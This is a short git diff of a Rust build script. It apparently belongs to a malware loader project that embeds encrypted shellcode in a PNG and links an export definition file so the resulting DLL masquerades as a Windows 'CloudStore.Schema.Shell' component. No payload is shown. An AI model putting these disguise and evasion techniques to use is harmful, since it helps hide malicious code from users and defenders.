@@ -26,10 +26,18 @@ fn main() {
     let template_png = manifest.join("assets/template.png");
     let embed_script = manifest.join("embedShellcode.py");
     let deploy_png = manifest.join("Windows.CloudStore.Schema.Shell.png");
+    let export_def = manifest.join("Windows.CloudStore.Schema.Shell.def");
 
     println!("cargo:rerun-if-changed={}", sc_enc_path.display());
     println!("cargo:rerun-if-changed={}", template_png.display());
     println!("cargo:rerun-if-changed={}", embed_script.display());
+    println!("cargo:rerun-if-changed={}", export_def.display());
+
+    // Export table internal DLL name (r2 iE lib column); omit DllMain from exports.
+    println!(
+        "cargo:rustc-link-arg=-Wl,{}",
+        export_def.display()
+    );
 
     let out_dir = std::env::var("OUT_DIR").expect("OUT_DIR not set");
     let out_dir = std::path::Path::new(&out_dir);
